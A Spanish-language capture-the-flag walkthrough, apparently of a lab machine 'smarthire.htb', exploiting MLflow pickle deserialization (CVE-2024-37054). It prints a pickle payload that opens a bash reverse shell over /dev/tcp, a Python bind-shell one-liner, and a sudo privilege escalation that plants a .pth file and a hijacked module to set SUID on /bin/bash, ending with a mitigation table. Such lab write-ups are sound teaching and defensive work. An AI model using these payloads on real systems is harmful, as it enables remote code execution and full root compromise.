🧨 Payload Pickle Malicioso

MLflow almacena modelos python_function como archivos pickle (`.pkl`). El endpoint /predict deserializa el modelo mediante mlflow.pyfunc.load_model().

Payload (redactado):

import pickle, os

class MaliciousModel:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/[REDACTED_IP]/4444 0>&1'"
        return (os.system, (cmd,))

Disparar el RCE:

curl -X POST http://smarthire.htb/predict -F "file=@predict.csv" -b cookies.txt

🔗 Bind Shell – Bypass del Firewall de Egreso

El firewall de egreso bloquea las conexiones salientes. Se utilizó una bind shell (escucha en el puerto 4444 del objetivo):

python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",4444)); s.listen(1); conn,addr=s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); subprocess.call(["/bin/bash","-i"])'

Conexión desde la máquina local:

nc [REDACTED_IP] 4444

Escalada de Privilegios

🔍 Enumeración de Sudo

sudo -l
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *

El script mlflowctl.py se ejecuta como root sin contraseña. El comodín * permite pasar argumentos arbitrarios.

🧐 Análisis de mlflowctl.py

#!/usr/bin/env python3
import sys, site

# Carga plugins desde /opt/tools/mlflow_ctl/plugins/
site.addsitedir('/opt/tools/mlflow_ctl/plugins/dev')

import mlflow_actions

def main():
    # ... llama a mlflow_actions.check_status() o mlflow_actions.restart()

El directorio dev/ es escribible por el grupo devs:

drwxrwxr-x 2 root devs 4096 Jan  1 00:00 dev

svcweb pertenece a devs.

🐍 Hijacking de Módulos Python mediante .pth

site.addsitedir() procesa archivos .pth. Cualquier línea que comience con import se ejecuta como código Python.

Comandos de explotación (redactados):

# Archivo .pth para hijack de sys.path
echo "import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')" > /opt/tools/mlflow_ctl/plugins/dev/evil.pth

# Módulo malicioso
cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os

def check_status():
    os.system("chmod +s /bin/bash")
    return "pwned"

def restart():
    os.system("chmod +s /bin/bash")
    return "pwned"
EOF

# Ejecución como root
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

Recomendaciones de Mitigación

VulnerabilidadMitigación
CVE-2024-37054 (Deserialización Pickle) Actualizar MLflow a versión parcheada. Usar safepickle o sandbox.
Credenciales por Defecto Forzar contraseñas robustas y habilitar autenticación multifactor.
Comodín * en sudo Reemplazar por reglas con argumentos explícitos en /etc/sudoers.
Directorios Python escribibles Restringir permisos de escritura en site-packages y directorios de plugins.
Abuso de .pth Usar imports absolutos. Verificar integridad de módulos antes de cargarlos.
Firewall de Egreso Implementar filtrado estricto de salida para evitar shells reversas.
